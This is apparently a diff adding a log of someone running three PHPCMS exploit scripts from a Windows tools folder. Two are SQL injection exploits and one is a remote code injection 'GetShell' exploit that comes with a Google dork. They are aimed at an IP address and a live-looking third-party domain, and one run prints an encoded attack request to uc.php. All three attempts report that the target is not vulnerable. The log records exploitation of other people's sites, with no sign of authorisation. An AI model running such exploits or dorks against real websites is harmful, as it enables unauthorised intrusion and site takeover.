@@ -1,0 +1,35 @@
+1.
+D:\Tools\GreenBoyTools\PHP运行环境>php.exe phpcms2008_c.php 222.208.58.55 / 1
+
++------------------------------------------------------+
+             PHPCMS2008 c.php/js.php 注入EXP
+             Site：http://www.waitalone.cn/
+                Exploit BY： 独自等待
+                  Time：2013-05-29
++------------------------------------------------------+
+报告大人，网站不存在此漏洞,请更换注入页面试试!
+
+2.
+
+D:\Tools\GreenBoyTools\PHP运行环境>php.exe phpcms.php www.sclzcx.cn / 1
+
++---------------------------------------------------------------------------+
+PHPCMS Remote Code Inject GetShell Exploit
+Google Dork:Powered by Phpcms 2008
+code by secr
++---------------------------------------------------------------------------+
+[+] Try to determine the Bug....
+[-] Exploit Failed! This site has No Bug!
+
+3. 
+
+D:\Tools\GreenBoyTools\PHP运行环境>php.exe phpcmsV9_uc_SQL.php www.sclzcx.cn /
+
+---------------------------------------------------------------------------
+PHPcms (v9 or Old Version) uc api sql injection 0day
+by rayh4c#80sec.com
+---------------------------------------------------------------------------
+[1] 访问 http://www.sclzcx.cn/phpsso_server/api/uc.php?code=2aeb9pxf%2FSCGYFL%2B
+dp8eFozODt7kKizmdfpMhF4k3Ka7o7EonfPwo7g7N1ad4jeD8W0RxG3ri96JOpy5%2FaiGWYpvIbyiB8
+SAzjUsRzfGhI%2FpgNQ
+[*]不存在SQL注入漏洞
